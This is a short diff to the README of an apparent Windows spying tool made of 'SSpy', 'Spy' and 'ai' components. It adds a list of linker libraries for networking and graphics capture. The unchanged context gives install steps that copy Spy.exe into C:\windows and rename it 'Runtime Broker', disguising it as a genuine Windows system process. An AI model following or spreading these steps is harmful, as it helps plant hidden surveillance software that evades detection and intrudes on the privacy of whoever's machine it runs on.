@@ -36,6 +36,7 @@ You are using this application at your own risk.
 ##### Compile
 Compilation is handled manually for now. To compile this program you need **Windows Vista or later and a C compiler**.
 I compiled with Visual Studio 2022(17.10.4) in Windows 10.
+SSpy uses wtsapi32.lib, Userenv.lib and Spy uses gdiplus.lib, ws2_32.lib, Pathcch.lib. ai uses ws2_32.lib. Add them to project property/Configuration properties/Linker/Input/Additional Dependencies. Or add `#pragma comment(lib, "ws2_32.lib") ... ` in cpp files. Some libraries might be useless, I'm not sure.
 
 ##### Install / Remove service
 1. Make sure that SSpy and Spy is compiled & rebuilded and copy Spy.exe to `C:\\windows` and change file name to `Runtime Broker`(without any file extension).
